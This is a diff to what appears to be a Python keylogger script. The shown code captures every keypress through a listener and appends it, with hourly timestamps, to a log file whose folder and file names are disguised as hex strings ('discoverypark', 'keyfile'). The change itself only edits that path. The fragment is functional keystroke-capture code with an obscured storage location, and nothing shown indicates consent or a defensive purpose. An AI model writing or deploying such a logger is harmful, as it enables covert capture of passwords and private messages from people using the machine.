@@ -44,12 +44,12 @@ def log_key(key):
 
     # Check if the hour has changed since the last logged keypress
     if current_hour != last_logged_hour:
-        with open("C:/dpa_646973636F766572797061726B/6B657966696C65.txt", 'a') as logFile:
+        with open("C:/646973636F766572797061726B/6B657966696C65.txt", 'a') as logFile:
             logFile.write(f"\n\n--- {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n")
         last_logged_hour = current_hour
 
     # Write the key to the file
-    with open("C:/dpa_646973636F766572797061726B/6B657966696C65.txt", 'a') as logFile:
+    with open("C:/646973636F766572797061726B/6B657966696C65.txt", 'a') as logFile:
         try:
             if key in special_keys:
                 logFile.write(special_keys[key])
@@ -64,7 +64,7 @@ def on_press(key):
     log_key(key)
 
 if __name__ == "__main__":
-    with open("C:/dpa_646973636F766572797061726B/6B657966696C65.txt", 'a') as logFile:
+    with open("C:/646973636F766572797061726B/6B657966696C65.txt", 'a') as logFile:
         logFile.write(f"\n\n--- {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n")
 
     # Start the listener
